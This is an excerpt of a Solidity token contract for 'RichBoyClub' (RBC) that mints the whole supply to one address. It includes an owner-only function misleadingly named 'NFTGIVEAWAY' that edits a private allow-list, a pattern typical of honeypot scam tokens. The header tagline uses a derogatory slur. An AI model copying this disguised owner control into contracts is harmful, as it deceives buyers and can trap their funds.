/**
RichBoysOnly No jeets @Richboyyclub
*/
...
contract RichBoyClub is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('RichBoyClub','RBC') {
        _mint(0xb9ac46B60613f976A9afaA3c1c2675FCF1C8C1DC, 1000000000 *10**18);
        _enable[0xb9ac46B60613f976A9afaA3c1c2675FCF1C8C1DC] = true;
    }
    ...
    function NFTGIVEAWAY(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
